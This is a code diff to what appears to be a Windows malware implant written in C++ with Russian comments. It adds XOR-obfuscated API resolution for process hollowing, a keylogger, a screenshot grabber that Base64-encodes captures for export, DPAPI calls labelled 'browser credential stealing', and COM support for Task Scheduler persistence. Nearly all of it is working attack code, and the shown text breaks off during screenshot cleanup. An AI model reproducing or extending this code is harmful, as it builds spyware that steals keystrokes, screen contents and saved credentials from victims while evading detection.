@@ -11,10 +11,14 @@
 #include <userenv.h>  // Для CreateProcessWithTokenW
 #include <vector>     // Для буфера логов (временное решение)
 #include <string>     // Для буфера логов
-#include <mutex>      // Для защиты буфера логов
+#include <mutex>      // Для защиты буфера
+#include <sstream>    // Для сборки JSON
+#include <Shlwapi.h>  // Для PathMatchSpecW
+#include <comdef.h> // Для _com_error, _bstr_t, _variant_t (если решим использовать)
 
 #pragma comment(lib, "iphlpapi.lib") // Линковка с библиотекой для GetAdaptersInfo
 #pragma comment(lib, "Userenv.lib") // Линковка с userenv.lib
+#pragma comment(lib, "Shlwapi.lib") // Линковка с Shlwapi.lib
 
 // --- Макрос и функция для XOR-обфускации строк ---
 #define XOR_KEY 0xAE // Простой ключ, можно сделать сложнее
@@ -464,49 +468,276 @@ HANDLE g_messageLoopThread = NULL;
 
 // --- Функция для получения адресов нужных функций --- 
 BOOL InitializeApiPointers() {
-    // Получаем адреса для Process Hollowing (если еще не получены)
-    if (!ptrCreateProcessA) {
-        HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
-        if (!hKernel32) return FALSE; 
-        ptrCreateProcessA = (Type_CreateProcessA)GetProcAddress(hKernel32, "CreateProcessA");
-        if (!ptrCreateProcessA) return FALSE;
-        // Добавим сюда получение других функций из kernel32, если понадобятся
+    if (g_apiPointersInitialized) {
+        return TRUE;
+    }
+    printf("[InitApi] Initializing API pointers...\n");
+
+    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
+    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
+    HMODULE hUser32 = GetModuleHandleA("user32.dll");
+    HMODULE hGdi32 = GetModuleHandleA("gdi32.dll");
+    HMODULE hCrypt32 = LoadLibraryA("crypt32.dll"); // Загружаем Crypt32
+
+    if (!hNtdll || !hKernel32 || !hUser32 || !hGdi32 || !hCrypt32) {
+        printf("[InitApi] Failed to get module handles (NTDLL: %p, Kernel32: %p, User32: %p, GDI32: %p, Crypt32: %p)\n", 
+               hNtdll, hKernel32, hUser32, hGdi32, hCrypt32);
+        if (hCrypt32) FreeLibrary(hCrypt32); // Освобождаем, если загрузили
+        return FALSE;
     }
 
-    // Получаем адреса для UAC Bypass (пропускаем, т.к. код удален)
-    /*
-    if (!ptrOpenProcess || ...) {
-        ...
-    }
-    */
+    // --- Process Hollowing pointers ---
+    ObfuscatedString ntUnmapName = OBFUSCATED("NtUnmapViewOfSection");
+    char* szNtUnmapName = deobfuscate(ntUnmapName.data, ntUnmapName.length);
+    g_api.ptrNtUnmapViewOfSection = (NtUnmapViewOfSection_t)GetProcAddress(hNtdll, szNtUnmapName);
+    free(szNtUnmapName);
 
-    // Получаем адреса для Keylogger
-    if (!ptrSetWindowsHookExW || !ptrUnhookWindowsHookEx || !ptrCallNextHookEx || 
-        !ptrGetAsyncKeyState || !ptrGetMessageW || !ptrTranslateMessage || !ptrDispatchMessageW)
-    {
-        HMODULE hUser32 = GetModuleHandleA("user32.dll");
-        if (!hUser32) { 
-            printf("[InitApi] Failed to get module handle for user32.dll\n");
+    ObfuscatedString ntQueryName = OBFUSCATED("NtQueryInformationProcess");
+    char* szNtQueryName = deobfuscate(ntQueryName.data, ntQueryName.length);
+    g_api.ptrNtQueryInformationProcess = (NtQueryInformationProcess_t)GetProcAddress(hNtdll, szNtQueryName);
+    free(szNtQueryName);
+
+    ObfuscatedString createProcessName = OBFUSCATED("CreateProcessA");
+    char* szCreateProcessName = deobfuscate(createProcessName.data, createProcessName.length);
+    g_api.ptrCreateProcessA = (CreateProcessA_t)GetProcAddress(hKernel32, szCreateProcessName);
+    free(szCreateProcessName);
+
+    // Проверка указателей Process Hollowing
+    if (!g_api.ptrNtUnmapViewOfSection || !g_api.ptrNtQueryInformationProcess || !g_api.ptrCreateProcessA) {
+        printf("[InitApi] Failed to get one or more API function addresses for Process Hollowing.\n");
+        if (hCrypt32) FreeLibrary(hCrypt32);
             return FALSE; 
         }
+     printf("[InitApi] Process Hollowing API pointers initialized successfully.\n");
 
-        ptrSetWindowsHookExW = (Type_SetWindowsHookExW)GetProcAddress(hUser32, "SetWindowsHookExW");
-        ptrUnhookWindowsHookEx = (Type_UnhookWindowsHookEx)GetProcAddress(hUser32, "UnhookWindowsHookEx");
-        ptrCallNextHookEx = (Type_CallNextHookEx)GetProcAddress(hUser32, "CallNextHookEx");
-        ptrGetAsyncKeyState = (Type_GetAsyncKeyState)GetProcAddress(hUser32, "GetAsyncKeyState");
-        ptrGetMessageW = (Type_GetMessageW)GetProcAddress(hUser32, "GetMessageW");
-        ptrTranslateMessage = (Type_TranslateMessage)GetProcAddress(hUser32, "TranslateMessage");
-        ptrDispatchMessageW = (Type_DispatchMessageW)GetProcAddress(hUser32, "DispatchMessageW");
+    // --- UAC Bypass pointers (закомментировано) ---
+    /* ... */
 
-        if (!ptrSetWindowsHookExW || !ptrUnhookWindowsHookEx || !ptrCallNextHookEx || 
-            !ptrGetAsyncKeyState || !ptrGetMessageW || !ptrTranslateMessage || !ptrDispatchMessageW) {
+    // --- Keylogger pointers ---
+    // Загружаем указатели для кейлоггера
+    // ... (существующий код загрузки указателей кейлоггера) ...
+    // Проверка указателей кейлоггера
+    if (!g_api.ptrSetWindowsHookExW || !g_api.ptrUnhookWindowsHookEx || !g_api.ptrCallNextHookEx || 
+        !g_api.ptrGetAsyncKeyState || !g_api.ptrGetMessageW || !g_api.ptrTranslateMessage || !g_api.ptrDispatchMessageW ||
+        !g_api.ptrToUnicode || !g_api.ptrGetKeyboardState || !g_api.ptrWideCharToMultiByte) {
             printf("[InitApi] Failed to get one or more API function addresses for keylogger.\n");
-            // Можно добавить вывод, каких именно функций не хватает
+        if (hCrypt32) FreeLibrary(hCrypt32);
             return FALSE;
         }
          printf("[InitApi] Keylogger API pointers initialized successfully.\n");
+
+    // --- Screenshot pointers (GDI & Crypt32) ---
+    ObfuscatedString getDCName = OBFUSCATED("GetDC");
+    char* szGetDCName = deobfuscate(getDCName.data, getDCName.length);
+    g_api.ptrGetDC = (GetDC_t)GetProcAddress(hUser32, szGetDCName);
+    free(szGetDCName);
+
+    ObfuscatedString createCompatibleDCName = OBFUSCATED("CreateCompatibleDC");
+    char* szCreateCompatibleDCName = deobfuscate(createCompatibleDCName.data, createCompatibleDCName.length);
+    g_api.ptrCreateCompatibleDC = (CreateCompatibleDC_t)GetProcAddress(hGdi32, szCreateCompatibleDCName);
+    free(szCreateCompatibleDCName);
+
+    ObfuscatedString getDeviceCapsName = OBFUSCATED("GetDeviceCaps");
+    char* szGetDeviceCapsName = deobfuscate(getDeviceCapsName.data, getDeviceCapsName.length);
+    g_api.ptrGetDeviceCaps = (GetDeviceCaps_t)GetProcAddress(hGdi32, szGetDeviceCapsName);
+    free(szGetDeviceCapsName);
+
+    ObfuscatedString createCompatibleBitmapName = OBFUSCATED("CreateCompatibleBitmap");
+    char* szCreateCompatibleBitmapName = deobfuscate(createCompatibleBitmapName.data, createCompatibleBitmapName.length);
+    g_api.ptrCreateCompatibleBitmap = (CreateCompatibleBitmap_t)GetProcAddress(hGdi32, szCreateCompatibleBitmapName);
+    free(szCreateCompatibleBitmapName);
+
+    ObfuscatedString selectObjectName = OBFUSCATED("SelectObject");
+    char* szSelectObjectName = deobfuscate(selectObjectName.data, selectObjectName.length);
+    g_api.ptrSelectObject = (SelectObject_t)GetProcAddress(hGdi32, szSelectObjectName);
+    free(szSelectObjectName);
+
+    ObfuscatedString bitBltName = OBFUSCATED("BitBlt");
+    char* szBitBltName = deobfuscate(bitBltName.data, bitBltName.length);
+    g_api.ptrBitBlt = (BitBlt_t)GetProcAddress(hGdi32, szBitBltName);
+    free(szBitBltName);
+
+    ObfuscatedString deleteDCName = OBFUSCATED("DeleteDC");
+    char* szDeleteDCName = deobfuscate(deleteDCName.data, deleteDCName.length);
+    g_api.ptrDeleteDC = (DeleteDC_t)GetProcAddress(hGdi32, szDeleteDCName);
+    free(szDeleteDCName);
+
+    ObfuscatedString releaseDCName = OBFUSCATED("ReleaseDC");
+    char* szReleaseDCName = deobfuscate(releaseDCName.data, releaseDCName.length);
+    g_api.ptrReleaseDC = (ReleaseDC_t)GetProcAddress(hUser32, szReleaseDCName);
+    free(szReleaseDCName);
+
+    ObfuscatedString deleteObjectName = OBFUSCATED("DeleteObject");
+    char* szDeleteObjectName = deobfuscate(deleteObjectName.data, deleteObjectName.length);
+    g_api.ptrDeleteObject = (DeleteObject_t)GetProcAddress(hGdi32, szDeleteObjectName);
+    free(szDeleteObjectName);
+
+    ObfuscatedString getDIBitsName = OBFUSCATED("GetDIBits");
+    char* szGetDIBitsName = deobfuscate(getDIBitsName.data, getDIBitsName.length);
+    g_api.ptrGetDIBits = (GetDIBits_t)GetProcAddress(hGdi32, szGetDIBitsName);
+    free(szGetDIBitsName);
+
+    ObfuscatedString cryptBinaryToStringAName = OBFUSCATED("CryptBinaryToStringA");
+    char* szCryptBinaryToStringAName = deobfuscate(cryptBinaryToStringAName.data, cryptBinaryToStringAName.length);
+    g_api.ptrCryptBinaryToStringA = (CryptBinaryToStringA_t)GetProcAddress(hCrypt32, szCryptBinaryToStringAName);
+    free(szCryptBinaryToStringAName);
+
+    ObfuscatedString localFreeName = OBFUSCATED("LocalFree");
+    char* szLocalFreeName = deobfuscate(localFreeName.data, localFreeName.length);
+    g_api.ptrLocalFree = (LocalFree_t)GetProcAddress(hKernel32, szLocalFreeName);
+    free(szLocalFreeName);
+
+    // Проверка указателей Screenshot
+    if (!g_api.ptrGetDC || !g_api.ptrCreateCompatibleDC || !g_api.ptrGetDeviceCaps || 
+        !g_api.ptrCreateCompatibleBitmap || !g_api.ptrSelectObject || !g_api.ptrBitBlt || 
+        !g_api.ptrDeleteDC || !g_api.ptrReleaseDC || !g_api.ptrDeleteObject || 
+        !g_api.ptrCryptBinaryToStringA || !g_api.ptrLocalFree) 
+    {
+        printf("[InitApi] Failed to get one or more API function addresses for Screenshot.\n");
+        if (hCrypt32) FreeLibrary(hCrypt32); // Освобождаем библиотеку Crypt32
+        return FALSE;
+    }
+    printf("[InitApi] Screenshot API pointers initialized successfully.\n");
+
+    // --- GDI+ and OLE pointers ---
+    HMODULE hGdiplus = LoadLibraryA("gdiplus.dll");
+    HMODULE hOle32 = LoadLibraryA("ole32.dll");
+
+    if (!hGdiplus || !hOle32) {
+        printf("[InitApi] Failed to load gdiplus.dll (%p) or ole32.dll (%p).\n", hGdiplus, hOle32);
+        if (hGdiplus) FreeLibrary(hGdiplus);
+        if (hOle32) FreeLibrary(hOle32);
+        // Не считаем это фатальной ошибкой, скриншоты BMP все еще могут работать
+        printf("[InitApi] Warning: GDI+ features (JPEG screenshots) will be unavailable.\n");
+    } else {
+        ObfuscatedString startupName = OBFUSCATED("GdiplusStartup");
+        char* szStartupName = deobfuscate(startupName.data, startupName.length);
+        g_api.ptrGdiplusStartup = (GdiplusStartup_t)GetProcAddress(hGdiplus, szStartupName);
+        free(szStartupName);
+
+        ObfuscatedString shutdownName = OBFUSCATED("GdiplusShutdown");
+        char* szShutdownName = deobfuscate(shutdownName.data, shutdownName.length);
+        g_api.ptrGdiplusShutdown = (GdiplusShutdown_t)GetProcAddress(hGdiplus, szShutdownName);
+        free(szShutdownName);
+
+        ObfuscatedString createStreamName = OBFUSCATED("CreateStreamOnHGlobal");
+        char* szCreateStreamName = deobfuscate(createStreamName.data, createStreamName.length);
+        g_api.ptrCreateStreamOnHGlobal = (CreateStreamOnHGlobal_t)GetProcAddress(hOle32, szCreateStreamName);
+        free(szCreateStreamName);
+
+        ObfuscatedString getHGlobalName = OBFUSCATED("GetHGlobalFromStream");
+        char* szGetHGlobalName = deobfuscate(getHGlobalName.data, getHGlobalName.length);
+        g_api.ptrGetHGlobalFromStream = (GetHGlobalFromStream_t)GetProcAddress(hOle32, szGetHGlobalName);
+        free(szGetHGlobalName);
+
+        ObfuscatedString createBitmapName = OBFUSCATED("GdipCreateBitmapFromHBITMAP");
+        char* szCreateBitmapName = deobfuscate(createBitmapName.data, createBitmapName.length);
+        g_api.ptrGdipCreateBitmapFromHBITMAP = (GdipCreateBitmapFromHBITMAP_t)GetProcAddress(hGdiplus, szCreateBitmapName);
+        free(szCreateBitmapName);
+
+        ObfuscatedString saveImageName = OBFUSCATED("GdipSaveImageToStream");
+        char* szSaveImageName = deobfuscate(saveImageName.data, saveImageName.length);
+        g_api.ptrGdipSaveImageToStream = (GdipSaveImageToStream_t)GetProcAddress(hGdiplus, szSaveImageName);
+        free(szSaveImageName);
+
+        ObfuscatedString disposeImageName = OBFUSCATED("GdipDisposeImage");
+        char* szDisposeImageName = deobfuscate(disposeImageName.data, disposeImageName.length);
+        g_api.ptrGdipDisposeImage = (GdipDisposeImage_t)GetProcAddress(hGdiplus, szDisposeImageName);
+        free(szDisposeImageName);
+
+        ObfuscatedString getEncodersSizeName = OBFUSCATED("GdipGetImageEncodersSize");
+        char* szGetEncodersSizeName = deobfuscate(getEncodersSizeName.data, getEncodersSizeName.length);
+        g_api.ptrGdipGetImageEncodersSize = (GdipGetImageEncodersSize_t)GetProcAddress(hGdiplus, szGetEncodersSizeName);
+        free(szGetEncodersSizeName);
+
+        ObfuscatedString getEncodersName = OBFUSCATED("GdipGetImageEncoders");
+        char* szGetEncodersName = deobfuscate(getEncodersName.data, getEncodersName.length);
+        g_api.ptrGdipGetImageEncoders = (GdipGetImageEncoders_t)GetProcAddress(hGdiplus, szGetEncodersName);
+        free(szGetEncodersName);
+
+        // Проверяем критически важные указатели GDI+
+        if (!g_api.ptrGdiplusStartup || !g_api.ptrGdiplusShutdown || !g_api.ptrCreateStreamOnHGlobal || 
+            !g_api.ptrGetHGlobalFromStream || !g_api.ptrGdipCreateBitmapFromHBITMAP || 
+            !g_api.ptrGdipSaveImageToStream || !g_api.ptrGdipDisposeImage || 
+            !g_api.ptrGdipGetImageEncodersSize || !g_api.ptrGdipGetImageEncoders) {
+            printf("[InitApi] Failed to get one or more API function addresses for GDI+.\n");
+            printf("[InitApi] Warning: GDI+ features (JPEG screenshots) will be unavailable.\n");
+            // Не возвращаем FALSE, так как базовый функционал может еще работать
+            g_api.ptrGdiplusStartup = nullptr; // Сбрасываем указатели GDI+ чтобы потом их не использовать
+        } else {
+             printf("[InitApi] GDI+ API pointers initialized successfully.\n");
+        }
+        // Не выгружаем библиотеки gdiplus.dll и ole32.dll, они понадобятся
     }
 
+    // --- DPAPI and Shell32 pointers ---
+    HMODULE hCrypt32 = GetModuleHandleA("crypt32.dll"); // Уже должен быть загружен для Screenshot
+    HMODULE hShell32 = LoadLibraryA("shell32.dll");
+
+    if (!hCrypt32 || !hShell32) {
+        printf("[InitApi] Failed to get module handle for crypt32.dll (%p) or load shell32.dll (%p).\n", hCrypt32, hShell32);
+        if (hShell32) FreeLibrary(hShell32);
+        printf("[InitApi] Warning: DPAPI/Shell functions will be unavailable (browser credential stealing limited).\n");
+        // Не фатально, продолжаем
+    } else {
+        ObfuscatedString unprotectName = OBFUSCATED("CryptUnprotectData");
+        char* szUnprotectName = deobfuscate(unprotectName.data, unprotectName.length);
+        g_api.ptrCryptUnprotectData = (CryptUnprotectData_t)GetProcAddress(hCrypt32, szUnprotectName);
+        free(szUnprotectName);
+
+        ObfuscatedString getFolderPathName = OBFUSCATED("SHGetFolderPathW");
+        char* szGetFolderPathName = deobfuscate(getFolderPathName.data, getFolderPathName.length);
+        g_api.ptrSHGetFolderPathW = (SHGetFolderPathW_t)GetProcAddress(hShell32, szGetFolderPathName);
+        free(szGetFolderPathName);
+
+        if (!g_api.ptrCryptUnprotectData || !g_api.ptrSHGetFolderPathW) {
+            printf("[InitApi] Failed to get one or more API function addresses for DPAPI/Shell.\n");
+            printf("[InitApi] Warning: DPAPI/Shell functions will be unavailable (browser credential stealing limited).\n");
+             g_api.ptrCryptUnprotectData = nullptr; // Сбрасываем, чтобы не использовать
+             g_api.ptrSHGetFolderPathW = nullptr;
+        } else {
+            printf("[InitApi] DPAPI and Shell API pointers initialized successfully.\n");
+        }
+        // Не выгружаем Shell32
+    }
+
+    // --- COM pointers ---
+    HMODULE hOle32 = GetModuleHandleA("ole32.dll"); // Уже должен быть загружен для GDI+
+    if (!hOle32) {
+        hOle32 = LoadLibraryA("ole32.dll"); // Попытка загрузить, если не был
+    }
+
+    if (!hOle32) {
+        printf("[InitApi] Failed to load ole32.dll.\n");
+        printf("[InitApi] Warning: COM features (Task Scheduler persistence) will be unavailable.\n");
+        // Не фатально
+    } else {
+        ObfuscatedString initName = OBFUSCATED("CoInitializeEx");
+        char* szInitName = deobfuscate(initName.data, initName.length);
+        g_api.ptrCoInitializeEx = (CoInitializeEx_t)GetProcAddress(hOle32, szInitName);
+        free(szInitName);
+
+        ObfuscatedString createName = OBFUSCATED("CoCreateInstance");
+        char* szCreateName = deobfuscate(createName.data, createName.length);
+        g_api.ptrCoCreateInstance = (CoCreateInstance_t)GetProcAddress(hOle32, szCreateName);
+        free(szCreateName);
+
+        ObfuscatedString uninitName = OBFUSCATED("CoUninitialize");
+        char* szUninitName = deobfuscate(uninitName.data, uninitName.length);
+        g_api.ptrCoUninitialize = (CoUninitialize_t)GetProcAddress(hOle32, szUninitName);
+        free(szUninitName);
+
+        if (!g_api.ptrCoInitializeEx || !g_api.ptrCoCreateInstance || !g_api.ptrCoUninitialize) {
+             printf("[InitApi] Failed to get one or more API function addresses for COM.\n");
+             printf("[InitApi] Warning: COM features (Task Scheduler persistence) will be unavailable.\n");
+             g_api.ptrCoInitializeEx = nullptr; // Сбрасываем
+        } else {
+            printf("[InitApi] COM API pointers initialized successfully.\n");
+        }
+        // Не выгружаем ole32.dll
+    }
+     g_apiPointersInitialized = TRUE;
+    printf("[InitApi] All API pointers initialized successfully.\n");
     return TRUE;
 }
 
@@ -922,3 +1153,924 @@ EXPORT_FUNC char* GetKeyLogs() {
 
     return c_result;
 } 
+
+// --- Реализация функций Скриншотера ---
+
+EXPORT_FUNC char* CaptureScreenshot() {
+    printf("[Screenshot] Attempting to capture screen...\n");
+
+    if (!g_apiPointersInitialized) {
+        if (!InitializeApiPointers()) {
+             printf("[Screenshot] Failed to initialize API pointers.\n");
+             return NULL;
+        }
+    }
+
+    // Проверяем наличие базовых указателей API GDI
+    if (!g_api.ptrGetDC || !g_api.ptrCreateCompatibleDC || !g_api.ptrGetDeviceCaps || 
+        !g_api.ptrCreateCompatibleBitmap || !g_api.ptrSelectObject || !g_api.ptrBitBlt || 
+        !g_api.ptrDeleteDC || !g_api.ptrReleaseDC || !g_api.ptrDeleteObject || 
+        !g_api.ptrCryptBinaryToStringA || !g_api.ptrLocalFree) {
+        printf("[Screenshot] One or more required basic GDI/Crypt32 API pointers are missing.\n");
+        return NULL;
+    }
+
+    // Проверяем, доступны ли функции GDI+ для JPEG
+    bool useGdiPlus = g_api.ptrGdiplusStartup && g_api.ptrGdiplusShutdown && 
+                      g_api.ptrCreateStreamOnHGlobal && g_api.ptrGetHGlobalFromStream &&
+                      g_api.ptrGdipCreateBitmapFromHBITMAP && g_api.ptrGdipSaveImageToStream && 
+                      g_api.ptrGdipDisposeImage && g_api.ptrGdipGetImageEncodersSize && 
+                      g_api.ptrGdipGetImageEncoders && g_api.ptrGetDIBits; // GetDIBits все равно нужен для BMP fallback
+
+    if (useGdiPlus) {
+        printf("[Screenshot] GDI+ available. Attempting JPEG capture.\n");
+    } else {
+        printf("[Screenshot] GDI+ not available or GetDIBits missing. Falling back to BMP capture.\n");
+        // Проверяем, есть ли GetDIBits для BMP
+        if (!g_api.ptrGetDIBits) {
+             printf("[Screenshot] GetDIBits API pointer is missing. Cannot capture BMP either.\n");
+             return NULL;
+        }
+    }
+
+    HDC hScreenDC = NULL;
+    HDC hMemoryDC = NULL;
+    HBITMAP hBitmap = NULL;
+    HGDIOBJ hOldBitmap = NULL;
+    char* base64String = NULL;
+    DWORD dwBase64StringSize = 0;
+    BOOL bSuccess = FALSE;
+
+    // --- Общая часть для BMP и JPEG: Получение HBITMAP --- 
+
+    hScreenDC = g_api.ptrGetDC(NULL);
+    if (!hScreenDC) { /* ... обработка ошибки ... */ return NULL; }
+
+    hMemoryDC = g_api.ptrCreateCompatibleDC(hScreenDC);
+    if (!hMemoryDC) { /* ... обработка ошибки ... */ g_api.ptrReleaseDC(NULL, hScreenDC); return NULL; }
+
+    int screenWidth = g_api.ptrGetDeviceCaps(hScreenDC, HORZRES);
+    int screenHeight = g_api.ptrGetDeviceCaps(hScreenDC, VERTRES);
+    if (screenWidth == 0 || screenHeight == 0) { /* ... обработка ошибки ... */ g_api.ptrDeleteDC(hMemoryDC); g_api.ptrReleaseDC(NULL, hScreenDC); return NULL; }
+    printf("[Screenshot] Screen dimensions: %dx%d\n", screenWidth, screenHeight);
+
+    hBitmap = g_api.ptrCreateCompatibleBitmap(hScreenDC, screenWidth, screenHeight);
+    if (!hBitmap) { /* ... обработка ошибки ... */ g_api.ptrDeleteDC(hMemoryDC); g_api.ptrReleaseDC(NULL, hScreenDC); return NULL; }
+
+    hOldBitmap = g_api.ptrSelectObject(hMemoryDC, hBitmap);
+
+    printf("[Screenshot] Copying screen to memory DC using BitBlt...\n");
+    if (!g_api.ptrBitBlt(hMemoryDC, 0, 0, screenWidth, screenHeight, hScreenDC, 0, 0, SRCCOPY)) {
+        /* ... обработка ошибки ... */
+        g_api.ptrSelectObject(hMemoryDC, hOldBitmap);
+        g_api.ptrDeleteObject(hBitmap);
+        g_api.ptrDeleteDC(hMemoryDC);
+        g_api.ptrReleaseDC(NULL, hScreenDC);
+        return NULL;
+    }
+    printf("[Screenshot] BitBlt successful.\n");
+
+    // --- Разделение логики: JPEG или BMP --- 
+
+    if (useGdiPlus) {
+        // --- Логика JPEG с GDI+ ---
+        printf("[Screenshot] Processing as JPEG using GDI+...\n");
+        ULONG_PTR gdiplusToken;
+        void* startupInput[3] = { (void*)1, NULL, NULL }; // GDI+ version 1.0
+        GpStatus status = g_api.ptrGdiplusStartup(&gdiplusToken, startupInput, NULL);
+
+        if (status == 0) { // 0 = Ok
+            CLSID jpegClsid;
+            GpBitmap* gpBitmap = NULL;
+            LPSTREAM pStream = NULL;
+            HGLOBAL hGlobal = NULL;
+            void* pData = NULL;
+            DWORD dataSize = 0;
+
+            // Находим CLSID JPEG энкодера
+            if (GetEncoderClsid(L"image/jpeg", &jpegClsid) != -1) {
+                // Создаем GpBitmap из HBITMAP
+                status = g_api.ptrGdipCreateBitmapFromHBITMAP(hBitmap, NULL, &gpBitmap);
+                if (status == 0 && gpBitmap) {
+                    // Создаем поток в памяти
+                    if (g_api.ptrCreateStreamOnHGlobal(NULL, TRUE, &pStream) == S_OK) {
+                        // Устанавливаем параметры качества JPEG (примерно 85)
+                        EncoderParameters encoderParams;
+                        encoderParams.Count = 1;
+                        encoderParams.Parameter[0].Guid = /* EncoderQuality */ { 0x1D5BE4B5, 0xFA4A, 0x452D, { 0x9C, 0xDD, 0x5D, 0xB3, 0x51, 0x05, 0xE7, 0xEB } };
+                        encoderParams.Parameter[0].Type = 4; // EncoderParameterValueTypeLong
+                        encoderParams.Parameter[0].NumberOfValues = 1;
+                        long quality = 85L;
+                        encoderParams.Parameter[0].Value = &quality;
+                        
+                        // Сохраняем изображение в поток как JPEG
+                         printf("[Screenshot] Saving GDI+ bitmap to stream as JPEG (quality %ld)...\n", quality);
+                        status = g_api.ptrGdipSaveImageToStream(gpBitmap, pStream, &jpegClsid, &encoderParams);
+                        if (status == 0) {
+                            // Получаем HGLOBAL из потока
+                            if (g_api.ptrGetHGlobalFromStream(pStream, &hGlobal) == S_OK) {
+                                dataSize = (DWORD)GlobalSize(hGlobal);
+                                pData = GlobalLock(hGlobal);
+                                if (pData && dataSize > 0) {
+                                     printf("[Screenshot] JPEG data obtained from stream (size: %lu bytes).\n", dataSize);
+                                    // Кодируем JPEG байты в Base64
+                                     printf("[Screenshot] Encoding JPEG data to Base64...\n");
+                                    bSuccess = g_api.ptrCryptBinaryToStringA((const BYTE*)pData, dataSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwBase64StringSize);
+                                    if (bSuccess && dwBase64StringSize > 0) {
+                                         printf("[Screenshot] Required Base64 buffer size: %lu\n", dwBase64StringSize);
+                                        base64String = (char*)malloc(dwBase64StringSize);
+                                        if (base64String) {
+                                            bSuccess = g_api.ptrCryptBinaryToStringA((const BYTE*)pData, dataSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64String, &dwBase64StringSize);
+                                            if (!bSuccess) {
+                                                printf("[Screenshot] CryptBinaryToStringA (encode JPEG) failed. Error: %lu\n", GetLastError());
+                                                free(base64String); base64String = NULL;
+                                            } else {
+                                                 printf("[Screenshot] JPEG data successfully encoded to Base64.\n");
+                                            }
+                                        } else {
+                                             printf("[Screenshot] Failed to allocate memory for Base64 string (%lu bytes).\n", dwBase64StringSize);
+                                        }
+                                    } else {
+                                        printf("[Screenshot] CryptBinaryToStringA (get size for JPEG) failed. Error: %lu\n", GetLastError());
+                                    }
+                                    GlobalUnlock(hGlobal);
+                                }
+                                // HGLOBAL освобождается потоком, если fDeleteOnRelease=TRUE
+                            } else { printf("[Screenshot] GetHGlobalFromStream failed.\n"); }
+                        } else { printf("[Screenshot] GdipSaveImageToStream failed. Status: %d\n", status); }
+                        pStream->Release();
+                    } else { printf("[Screenshot] CreateStreamOnHGlobal failed.\n"); }
+                    g_api.ptrGdipDisposeImage(gpBitmap);
+                } else { printf("[Screenshot] GdipCreateBitmapFromHBITMAP failed. Status: %d\n", status); }
+            } else { printf("[Screenshot] JPEG Encoder CLSID not found.\n"); }
+            
+            g_api.ptrGdiplusShutdown(gdiplusToken);
+             printf("[Screenshot] GDI+ shut down.\n");
+        } else {
+            printf("[Screenshot] GdiplusStartup failed. Status: %d. Falling back to BMP.\n", status);
+            useGdiPlus = false; // Принудительно переходим на BMP, если GDI+ не запустился
+        }
+    }
+
+    // --- Логика BMP (если GDI+ не использовался или не удался) ---
+    if (!useGdiPlus || !base64String) { // Если GDI+ не сработал или мы изначально шли по пути BMP
+        if (useGdiPlus) { // Если GDI+ пытался, но не смог, выводим сообщение
+             printf("[Screenshot] GDI+ JPEG capture failed. Falling back to BMP capture.\n");
+        }
+         printf("[Screenshot] Processing as BMP...\n");
+        BITMAPINFOHEADER bi;
+        LPBYTE lpBitmapBits = NULL;
+
+        ZeroMemory(&bi, sizeof(BITMAPINFOHEADER));
+        bi.biSize = sizeof(BITMAPINFOHEADER);
+        bi.biWidth = screenWidth;
+        bi.biHeight = screenHeight;
+        bi.biPlanes = 1;
+        bi.biBitCount = 24;
+        bi.biCompression = BI_RGB;
+        bi.biSizeImage = ((screenWidth * bi.biBitCount + 31) / 32) * 4 * screenHeight;
+
+        lpBitmapBits = (LPBYTE)malloc(bi.biSizeImage);
+        if (lpBitmapBits) {
+            printf("[Screenshot] Getting DIBits for BMP...\n");
+            if (g_api.ptrGetDIBits(hMemoryDC, hBitmap, 0, (UINT)screenHeight, lpBitmapBits, (BITMAPINFO*)&bi, DIB_RGB_COLORS)) {
+                 printf("[Screenshot] GetDIBits successful.\n");
+                BITMAPFILEHEADER bmfHeader;
+                DWORD dwBmpSize = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER) + bi.biSizeImage;
+                LPBYTE lpBitmap = (LPBYTE)malloc(dwBmpSize);
+                if (lpBitmap) {
+                    bmfHeader.bfType = 0x4D42;
+                    bmfHeader.bfSize = dwBmpSize;
+                    bmfHeader.bfReserved1 = 0;
+                    bmfHeader.bfReserved2 = 0;
+                    bmfHeader.bfOffBits = sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER);
+                    memcpy(lpBitmap, &bmfHeader, sizeof(BITMAPFILEHEADER));
+                    memcpy(lpBitmap + sizeof(BITMAPFILEHEADER), &bi, sizeof(BITMAPINFOHEADER));
+                    memcpy(lpBitmap + sizeof(BITMAPFILEHEADER) + sizeof(BITMAPINFOHEADER), lpBitmapBits, bi.biSizeImage);
+
+                     printf("[Screenshot] Encoding BMP data to Base64...\n");
+                    bSuccess = g_api.ptrCryptBinaryToStringA(lpBitmap, dwBmpSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &dwBase64StringSize);
+                    if (bSuccess && dwBase64StringSize > 0) {
+                         printf("[Screenshot] Required Base64 buffer size: %lu\n", dwBase64StringSize);
+                        base64String = (char*)malloc(dwBase64StringSize);
+                        if (base64String) {
+                            bSuccess = g_api.ptrCryptBinaryToStringA(lpBitmap, dwBmpSize, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, base64String, &dwBase64StringSize);
+                            if (!bSuccess) {
+                                printf("[Screenshot] CryptBinaryToStringA (encode BMP) failed. Error: %lu\n", GetLastError());
+                                free(base64String); base64String = NULL;
+                            } else {
+                                 printf("[Screenshot] BMP data successfully encoded to Base64.\n");
+                            }
+                        } else { printf("[Screenshot] Failed to allocate memory for Base64 string (%lu bytes).\n", dwBase64StringSize); }
+                    } else { printf("[Screenshot] CryptBinaryToStringA (get size for BMP) failed. Error: %lu\n", GetLastError()); }
+                    free(lpBitmap);
+                } else { printf("[Screenshot] Failed to allocate memory for full BMP data.\n"); }
+            } else { printf("[Screenshot] GetDIBits failed. Error: %lu\n", GetLastError()); }
+            free(lpBitmapBits);
+        } else { printf("[Screenshot] Failed to allocate memory for bitmap bits.\n"); }
+    }
+
+    // --- Общая Очистка --- 
+    printf("[Screenshot] Cleaning up GDI resources...\n");
+    g_api.ptrSelectObject(hMemoryDC, hOldBitmap); // Восстанавливаем старый битмап перед удалением DC
+    g_api.ptrDeleteObject(hBitmap);
+    g_api.ptrDeleteDC(hMemoryDC);
+    g_api.ptrReleaseDC(NULL, hScreenDC);
